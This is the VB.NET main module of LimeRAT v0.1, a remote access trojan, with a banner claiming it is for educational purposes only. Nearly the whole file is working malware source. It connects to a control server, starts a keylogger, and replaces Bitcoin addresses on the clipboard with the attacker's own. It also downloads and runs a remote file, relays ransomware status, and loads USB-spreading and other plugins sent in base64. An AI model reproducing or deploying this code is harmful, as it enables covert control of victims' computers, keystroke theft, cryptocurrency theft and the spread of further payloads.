'##################################################################
'##        N Y A N   C A T  |||   Updated on May./16/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                      .. LimeRAT v0.1 ..                      ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##            https://github.com/NYAN-x-CAT/Lime-RAT            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################

Namespace Lime

    Public Class C_Main
        Public Shared C As New C_Socket
        Public Shared SPL = C_Settings.SPL

        Public Shared Sub Main()

            'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
            'Thread.Sleep(35000) '[New client infected]
            'End If

            Threading.Thread.Sleep(1000)

            Dim createdNew As Boolean 'Making sure that only 1 process is running
            C_Settings.NMT = New Threading.Mutex(True, C_Settings.MTX, createdNew)
            Try
                If Not createdNew Then End
            Finally
                If createdNew Then
                    C_Settings.NMT.ReleaseMutex()
                End If
            End Try

            If C_Settings.ANTI Then
                Call Anti()
            End If

            Call C_Installation.INS()

            C_Socket.T1.Start() 'Start TCP connection to server

            If C_Settings.BTC_ADDR.Length > 25 Then
                Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf _BTC_ST)
                _BTC.SetApartmentState(Threading.ApartmentState.STA)
                _BTC.Start()
            End If

            If C_Settings.USB Then
                Dim _USB As Threading.Thread = New Threading.Thread(AddressOf StartSP)
                _USB.Start()
            End If

            If C_Settings.PIN Then
                Dim _PIN As Threading.Thread = New Threading.Thread(AddressOf StartPIN)
                _PIN.Start()
            End If

            Dim CHK As Threading.Thread = New Threading.Thread(AddressOf Checking)
            CHK.Start()

            Dim KL As New C_Keylog
            KL.Start()

            Try
                If C_Settings.DWN_LINK <> "" Then

                    If C_Settings.DWN_CHK = True Then
                        If GTV("DWN") <> "True" Then
                            Dim WC As New Net.WebClient
                            Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
                            WC.DownloadFile(C_Settings.DWN_LINK, file)
                            Diagnostics.Process.Start(file)
                            STV("DWN", "True")
                        End If

                    Else
                        Dim WC As New Net.WebClient
                        Dim file As String = IO.Path.GetTempFileName + IO.Path.GetFileName(C_Settings.DWN_LINK)
                        WC.DownloadFile(C_Settings.DWN_LINK, file)
                        Diagnostics.Process.Start(file)
                    End If
                End If
            Catch ex As Exception
                C.Send("MSG" + SPL + "DWN Error! " + ex.Message) 'Maybe file is not FUD or link problem
            End Try

        End Sub

#Region "Loops"

        Private Shared Sub Checking()
            Threading.Thread.CurrentThread.Sleep(5000)
            Dim Old As String = GTV("Rans-Status")
            Dim Old2 As String = GTV("USB")


            While True
                Try
1:
                    If C.CNT = True Then
                        Threading.Thread.CurrentThread.Sleep(3000)
                        'Compare old string with new string            
                        If Old <> GTV("Rans-Status").ToString Then
                            Old = GTV("Rans-Status")
                            C.Send("!R" & SPL & GTV("Rans-Status").ToString)
                        End If

                        If C_Settings.USB Then
                            If Old2 <> GTV("USB").ToString Then
                                Old2 = GTV("USB")
                                C.Send("!SP" & SPL & GTV("USB").ToString)
                            End If
                        End If
                    Else
                        Threading.Thread.CurrentThread.Sleep(5000)
                    End If
                Catch ex As Exception
                    GoTo 1
                End Try
            End While

        End Sub

        Private Shared Sub _BTC_ST()
            While True
                Try

                    Threading.Thread.CurrentThread.Sleep(1000)

                    'checking if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                    'the length is between 26-35 characters
                    'more info https://en.bitcoin.it/wiki/Address

                    If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
                        If My.Computer.Clipboard.GetText.StartsWith("1") OrElse My.Computer.Clipboard.GetText.StartsWith("3") OrElse My.Computer.Clipboard.GetText.StartsWith("bc1") Then
                            My.Computer.Clipboard.SetText(C_Settings.BTC_ADDR)
                        End If
                    End If
                Catch ex As Exception
                    C.Send("MSG" + SPL + "BTC Error! " + ex.Message)
                End Try
            End While
        End Sub

        Private Shared Sub StartSP()
            Try
                If GTV("_USB") = Nothing Then
                    While True
                        If C.CNT = True Then
                            Threading.Thread.CurrentThread.Sleep(9000)
                            C.Send("PLUSB")
                            Exit While
                        End If
                    End While

                Else
                    C_Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
                End If
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub StartPIN()
            Try
                If GTV("_PIN") = Nothing Then
                    While True
                        If C.CNT = True Then
                            Threading.Thread.CurrentThread.Sleep(11000)
                            C.Send("PLPIN")
                            Exit While
                        End If
                    End While

                Else
                    C_Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
                End If
            Catch ex As Exception
            End Try
        End Sub

#End Region

    End Class

End Namespace